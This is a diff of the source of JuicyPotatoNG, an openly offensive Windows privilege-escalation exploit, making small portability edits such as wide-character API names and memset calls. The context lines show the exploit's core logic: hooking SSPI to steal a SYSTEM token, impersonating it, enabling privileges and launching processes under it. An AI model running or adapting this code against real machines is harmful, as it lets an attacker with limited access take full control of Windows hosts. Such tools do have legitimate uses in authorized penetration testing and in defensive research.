@@ -1,4 +1,4 @@
-#include "Windows.h"
+﻿#include "Windows.h"
 #include "stdio.h"
 #include "strsafe.h"
 #include "netfw.h"
@@ -121,8 +121,8 @@ int wmain(int argc, wchar_t** argv)
 
 	if (!testingClsid) 
 		printf("[*] Testing CLSID %S - COM server port %S \n", clsidStr, comPort);
-	g_hEventAuthTriggered = CreateEvent(NULL, TRUE, FALSE, NULL);
-	g_hEventTokenStolen = CreateEvent(NULL, TRUE, FALSE, NULL);
+	g_hEventAuthTriggered = CreateEventW(NULL, TRUE, FALSE, NULL);
+	g_hEventTokenStolen = CreateEventW(NULL, TRUE, FALSE, NULL);
 	g_SystemTokenStolen = FALSE;
 	HookSSPIForTokenStealing(clsidStr);
 	ImpersonateInteractiveSid();
@@ -159,7 +159,7 @@ int wmain(int argc, wchar_t** argv)
 
 void ImpersonateInteractiveSid() {
 	HANDLE hToken;
-	if (!LogonUser(L"JuicyPotatoNG", L".", L"JuicyPotatoNG", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
+	if (!LogonUserW(L"JuicyPotatoNG", L".", L"JuicyPotatoNG", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
 		printf("[!] LogonUser failed with error code %d \n", GetLastError());
 		exit(-1);
 	}
@@ -172,7 +172,7 @@ BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 	LUID luid;
 	PRIVILEGE_SET privs;
 	BOOL privEnabled;
-	if (!LookupPrivilegeValue(NULL, priv, &luid))
+	if (!LookupPrivilegeValueW(NULL, priv, &luid))
 	{
 		printf("LookupPrivilegeValue() failed, error %u\n", GetLastError());
 		return FALSE;
@@ -231,15 +231,15 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interac
 	if (cmdline != NULL)
 	{
 		command = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxCmdlineLen * sizeof(WCHAR));
-		StringCchCopy(command, maxCmdlineLen, appname);
-		StringCchCat(command, maxCmdlineLen, L" ");
-		StringCchCat(command, maxCmdlineLen, cmdline);
+		StringCchCopyW(command, maxCmdlineLen, appname);
+		StringCchCatW(command, maxCmdlineLen, L" ");
+		StringCchCatW(command, maxCmdlineLen, cmdline);
 	}
 
 	if (*processtype == L'u' || *processtype == L'*')
 	{
-		ZeroMemory(&si, sizeof(STARTUPINFO));
-		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+		memset(&si, 0, sizeof(STARTUPINFO));
+		memset(&pi, 0, sizeof(PROCESS_INFORMATION));
 		si.cb = sizeof(STARTUPINFO);
 		si.lpDesktop = desktopName;
 		dwCreationFlags = interactiveMode ? 0 : CREATE_NEW_CONSOLE;
@@ -265,8 +265,8 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interac
 
 	if (*processtype == L't' || *processtype == L'*')
 	{
-		ZeroMemory(&si, sizeof(STARTUPINFO));
-		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+		memset(&si, 0, sizeof(STARTUPINFO));
+		memset(&pi, 0, sizeof(PROCESS_INFORMATION));
 		si.cb = sizeof(STARTUPINFO);
 		si.lpDesktop = desktopName;
 		
@@ -317,7 +317,6 @@ void SeekNonFilteredPorts() {
 	pNetFwMgr->Release();
 	CoUninitialize();
 }
-
 
 void usage()
 {
